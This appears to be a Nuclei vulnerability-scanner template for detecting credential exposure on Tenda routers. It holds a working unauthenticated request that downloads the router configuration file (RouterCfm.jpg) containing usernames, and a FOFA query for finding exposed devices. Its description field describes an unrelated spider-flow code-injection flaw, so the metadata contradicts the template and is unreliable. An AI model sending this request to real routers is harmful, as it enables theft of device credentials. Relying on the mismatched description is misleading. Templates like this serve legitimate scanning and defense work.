http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "http_username", "device_remark")
    - contains(header, "config/conf")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /cgi-bin/DownloadCfg/RouterCfm.jpg HTTP/1.1

    Host: {{Hostname}}

    '
id: tendat-credential
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:h:tendacn:g0:*:*:*:*:*:*:*:*
  description: 'A vulnerability, which was classified as critical, was found in spider-flow
    0.4.3. Affected is the function FunctionService.saveFunction of the file src/main/java/org/spiderflow/controller/FunctionController.java.
    The manipulation leads to code injection. It is possible to launch the attack
    remotely. The exploit has been disclosed to the public and may be used. VDB-249510
    is the identifier assigned to this vulnerability.

    '
  metadata:
    fofa-query: title="Tenda | LOGIN" && country="CN"
    max-request: 1
    product: g0
    vendor: tendacn
    verified: true
  name: Tendat Router Credential - Exposure
  reference:
  - https://github.com/wy876/POC/blob/main/Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2.md
  severity: high
  tags: tendat,exposure,config
